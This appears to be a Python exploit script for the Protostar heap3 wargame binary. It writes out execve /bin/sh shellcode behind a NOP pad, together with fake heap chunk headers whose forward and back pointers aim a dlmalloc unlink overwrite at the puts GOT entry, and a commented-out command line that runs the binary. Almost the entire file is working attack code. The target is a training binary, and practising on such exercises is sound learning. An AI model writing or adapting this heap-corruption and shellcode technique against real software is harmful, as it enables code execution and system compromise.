


first_argument = "\x90" * (32-28)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" #28
first_argument += shellcode

# first_argument = "\x90" * (32-6)
# first_argument += "\x68\x64\x88\x04\x08\xc3"

third_argumert = "b" * 3 # actually we are goin to write 4 byte: 3byte for "b" 1byte "0" <- end of string 

second_argumet = "a" * 32 #size of buffer
second_argumet += '\xfc\xff\xff\xff' # prev_size
second_argumet += '\xfc\xff\xff\xff' # size
second_argumet +=  'dddd' 

# (0x804b128 - 12) = 0x804b11c puts
# (0x8048864 - 8) = 0x804885c winner
# 0x804c008
second_argumet += '\x1c\xb1\x04\x08' # forword ponter
second_argumet += '\x08\xc0\x04\x08' # backword ponter




payload = first_argument + " " + second_argumet + " " + third_argumert

print(payload)

# /opt/protostar/bin/heap3 AAAA `python -c "print 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'A' * 4 + '\x42\x42\x42\x42\x43\x43\x43\x43'"` DDD